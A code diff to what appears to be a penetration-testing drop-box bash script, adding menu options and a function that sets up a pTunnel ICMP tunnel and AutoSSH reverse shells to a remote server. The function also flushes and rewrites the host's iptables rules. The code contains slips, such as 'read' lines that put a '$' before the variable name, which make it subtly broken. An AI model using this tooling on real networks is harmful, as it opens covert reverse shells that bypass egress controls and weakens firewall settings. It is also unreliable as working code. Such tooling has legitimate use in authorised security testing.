@@ -434,12 +434,11 @@ f_reverse(){
 echo "				REVERSE SHELLS"
 echo ""
 echo ""
-echo "[1] Setup AutoSSH (if you can ssh out)"
-echo "[2] Setup pTunnel - (if you can ping out)"
-echo ""
-echo "+++++++++++++++++ EXECUTE SHELL +++++++++++++++++ "
-echo ""
+echo "[1] Setup AutoSSH"
+echo "[2] Setup pTunnel - (TCP over ICMP)"
 echo "[3] Start AutoSSH reverse shell"
+echo ""
+echo "[4] Stop pTunnnel"
 echo "[0] Exit to main menu"
 echo ""
 read -p "Choice: " serviceschoice
@@ -448,6 +447,7 @@ case $serviceschoice in
 1) clear; f_autossh ;;
 2) clear; f_ptunnel ;;
 3) clear; f_start_autossh ;;
+4) clear; echo "Attempting to shutdown ptunnel" ; kill -KILL $(cat /opt/ptunnel.pid) ; sleep 5 ;;
 0) f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
@@ -534,7 +534,21 @@ f_reverse
 }
 
 f_ptunnel(){
-	echo "Set up pTunnel"
+	echo "Pick interface to start ptunnel on"
+	sleep 3
+	f_pick_interface
+	read -p "Password for pTunnel client/server: " $ptunpassword
+	read -p "Server address/name hosting pTunnel server: " $pserver
+	iptables -F
+	iptables -P INPUT ACCEPT
+	iptables -A INPUT -i lo -j ACCEPT
+	iptables -A INPUT -p icmp -j ACCEPT
+	iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+	iptables -A INPUT -j DROP
+	ptunnel -c $pickinterface -x $ptunpassword -p -lp 8000 -da $pserver -dp 22 -daemon /opt/ptunnel.pid &
+	echo "To connect to $pserver use:"
+	echo "ssh -p 8000 localhost"
+f_reverse
 }
 
 ########################## USB HID MENU ###############################
